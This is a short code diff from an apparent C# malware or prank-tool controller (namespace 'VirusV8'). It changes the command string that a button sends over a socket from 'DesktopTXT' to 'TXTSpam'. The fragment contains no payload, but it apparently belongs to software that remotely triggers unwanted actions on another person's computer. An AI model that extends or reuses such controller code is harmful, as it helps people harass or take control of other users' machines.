@@ -244,7 +244,7 @@ namespace VirusV8
 
         private void monoFlat_ButtonDektopTXT_Click(object sender, EventArgs e)
         {
-            byte[] bytes = Encoding.ASCII.GetBytes("DesktopTXT");
+            byte[] bytes = Encoding.ASCII.GetBytes("TXTSpam");
             s.send(bytes);
         }
     }
